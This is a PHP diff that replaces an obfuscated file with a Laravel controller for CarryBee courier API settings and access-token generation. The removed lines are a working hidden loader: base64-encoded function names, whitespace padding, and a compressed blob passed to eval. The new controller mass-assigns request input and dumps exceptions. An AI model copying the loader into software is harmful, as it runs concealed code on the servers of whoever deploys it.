@@ -1,208 +1,70 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Http\Controllers;
+
+use App\CarryBeeApi;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+
+class CarryBeeApiSettingsController extends Controller
+{
+    public function index()
+    {
+        $data = CarryBeeApi::find(1);
+        return view('backEnd.admin.carrybee_api_settings', compact('data'));
+    }
+
+    public function update(Request $request)
+    {
+        try {
+            if ($request->is_active) {
+                $is_active = 1;
+            } else {
+                $is_active = 0;
+            }
+
+            $input = array_merge($request->all(), [
+                'is_active' => $is_active
+            ]);
+
+            CarryBeeApi::find(1)->update($input);
+            return redirect()->back()->with('success', 'CarryBee API Settings Updated Successfully');
+        } catch (\Exception $e) {
+            dd($e);
+            return redirect()->back()->with('error', $e);
+        }
+    }
+
+    public function generateAccessToken(Request $request)
+    {
+        $credential = DB::table('carry_bee_apis')->select('email', 'password')->where('id', 1)->first();
+        //dd($credential);
+        $url = 'https://developers.carrybee.com/api/login';
+        $curl = curl_init();
+        $vars = [
+            'email' => $credential->email,
+            'password' => $credential->password,
+            'grant_type' => 'password',
+        ];
+        $headers = [
+            'accept: application/json',
+            'content-type: application/json',
+        ];
+        $json_string = json_encode($vars);
+        //dd($json_string);
+        curl_setopt($curl, CURLOPT_URL, $url);
+        curl_setopt($curl, CURLOPT_POST, true);
+        curl_setopt($curl, CURLOPT_POSTFIELDS, $json_string);
+        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        $data = curl_exec($curl);
+        $data = json_decode($data, true);
+        curl_close($curl);
+
+        CarryBeeApi::find(1)->update([
+            'access_token' => $data['data']['token']
+        ]);
+
+        return back()->with('success', 'New Access Token Generated Successfully');
+    }
+}
